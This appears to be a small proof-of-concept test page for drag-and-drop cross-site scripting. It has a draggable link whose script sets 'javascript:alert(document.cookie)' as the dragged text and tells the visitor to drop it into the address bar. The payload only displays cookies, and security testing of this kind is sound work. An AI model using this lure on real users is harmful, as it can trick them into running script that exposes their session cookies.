<!DOCTYPE html>
<html>
<head>
  <title>Drag XSS Test</title>
</head>
<body>

<h2>Drag this to the address bar 👇</h2>

<a href="#" draggable="true" id="dragme" style="padding:10px;background:red;color:white;cursor:grab;">
  Drag me
</a>

<script>
document.getElementById('dragme').ondragstart = function(e) {
  e.dataTransfer.setData(
    'text/plain',
    'javascript:alert(document.cookie)'
  );
};
</script>
